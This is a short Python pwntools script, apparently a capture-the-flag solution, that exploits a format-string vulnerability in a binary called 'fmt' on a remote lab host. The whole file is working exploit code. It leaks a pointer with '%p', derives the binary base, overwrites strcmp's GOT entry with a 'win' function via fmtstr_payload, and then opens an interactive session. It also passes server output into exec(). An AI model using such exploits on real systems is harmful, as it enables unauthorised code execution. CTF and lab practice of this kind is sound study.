from pwn import *

context.arch = 'amd64'

e = ELF('./fmt')

#p = process('./fmt')
p = remote('192.168.200.106', 10009)

STRCMP_OFFSET = e.symbols['strcmp']
WIN_OFFSET = e.symbols['win']
EXIT_STR_OFFSET = list(e.search(b"EXIT"))[0]

print(hex(WIN_OFFSET))
print(hex(EXIT_STR_OFFSET))

p.sendline(b'%p')
exec("BINARY_BASE=" + p.recvuntil(b'\n', drop=True).decode("utf-8") + "-" + hex(EXIT_STR_OFFSET))
e.address = BINARY_BASE

payload = fmtstr_payload(6, {e.got['strcmp'] : e.symbols['win']}, 0, 'byte')

p.sendline(payload)

p.interactive()

# flag is flag{apple_pie!}